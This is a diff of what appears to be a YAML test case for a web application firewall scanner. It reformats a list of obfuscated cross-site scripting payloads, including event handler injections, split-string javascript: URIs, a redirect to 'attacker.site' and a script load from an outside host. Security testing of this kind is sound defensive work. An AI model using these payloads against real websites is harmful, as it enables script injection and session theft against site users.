@@ -1,38 +1,38 @@
-encoder:
-- Base64Flat
-- URL
 payload:
-- <body onload=alert('test1')>
-- <IMG SRC=j&#X41vascript:alert('test')>
-- '"onwheel=ead(111)'
-- __proto__[v-if]=_c.constructor('alert(1)')()
-- sometext<svg onload=alert(document.domain)>?mimeType=text/html
-- '"));if(!self.x)self.x=!alert(document.domain)}catch(e){}//'
-- <img src=x onerror=alert(document.domain)>/all
-- confirm.call(null,1)
-- javascript:setInterval('ale'+'rt(document.domain)')
-- javascript:setInterval('fet'+'ch(document.domain)')
-- javascript:setInterval('con'+'firm(document.domain)')
-- javascript:setInterval('prom'+'pt(document.domain)')
-- alert.call(%20, "XSS");
-- (alert)(1)
-- <svg/onload=alert(=RND=)//
-- '"onClick="(prompt)(1)'
-- '''>alert(1)</script><script/1='''
-- '"//Onx=""//onfocus=prompt(1)>'
-- '"Onx=() onMouSeoVer=prompt(1)>'
-- '"OnCliCk="(prompt`1`)'
-- prompt.call(null,1)
-- alert.apply(null, [1])
-- '&lt;svg/onload&equals;alert(1)&gt;'
-- \"autof<x>ocus o<x>nfocus=alert<x>(1)//
-- '"><p only=1337 onmouseenter=window.location.href=//attacker.site>'
-- '"><svg onmouseover="confirm&#0000000040document.domain)'
-- "<<scr\0ipt/src=http://xss.com/xss.js></script"
-- '''-alert(1)//'
+  - <body onload=alert('test1')>
+  - <IMG SRC=j&#X41vascript:alert('test')>
+  - '"onwheel=ead(111)'
+  - __proto__[v-if]=_c.constructor('alert(1)')()
+  - sometext<svg onload=alert(document.domain)>?mimeType=text/html
+  - '"));if(!self.x)self.x=!alert(document.domain)}catch(e){}//'
+  - <img src=x onerror=alert(document.domain)>/all
+  - confirm.call(null,1)
+  - javascript:setInterval('ale'+'rt(document.domain)')
+  - javascript:setInterval('fet'+'ch(document.domain)')
+  - javascript:setInterval('con'+'firm(document.domain)')
+  - javascript:setInterval('prom'+'pt(document.domain)')
+  - alert.call(%20, "XSS");
+  - (alert)(1)
+  - <svg/onload=alert(=RND=)//
+  - '"onClick="(prompt)(1)'
+  - "'>alert(1)</script><script/1='"
+  - '"//Onx=""//onfocus=prompt(1)>'
+  - '"Onx=() onMouSeoVer=prompt(1)>'
+  - '"OnCliCk="(prompt`1`)'
+  - prompt.call(null,1)
+  - alert.apply(null, [1])
+  - '&lt;svg/onload&equals;alert(1)&gt;'
+  - \"autof<x>ocus o<x>nfocus=alert<x>(1)//
+  - '"><p only=1337 onmouseenter=window.location.href=//attacker.site>'
+  - '"><svg onmouseover="confirm&#0000000040document.domain)'
+  - "<<scr\0ipt/src=http://xss.com/xss.js></script"
+  - "\'-alert(1)//"
+encoder:
+  - Base64Flat
+  - URL
 placeholder:
-- URLPath
-- URLParam
-- HTMLForm
-- HTMLMultipartForm
+  - URLPath
+  - URLParam
+  - HTMLForm
+  - HTMLMultipartForm
 type: XSS
